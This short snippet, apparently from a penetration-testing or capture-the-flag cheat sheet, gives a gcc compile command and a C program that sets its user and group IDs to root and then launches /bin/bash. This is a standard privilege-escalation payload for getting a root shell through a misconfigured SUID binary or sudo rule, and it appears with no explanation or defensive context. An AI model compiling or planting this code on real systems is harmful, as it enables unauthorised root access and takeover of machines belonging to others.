`gcc SCRIPT.c -o COMPILED.c`

C code:

```
int main(){
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}
```

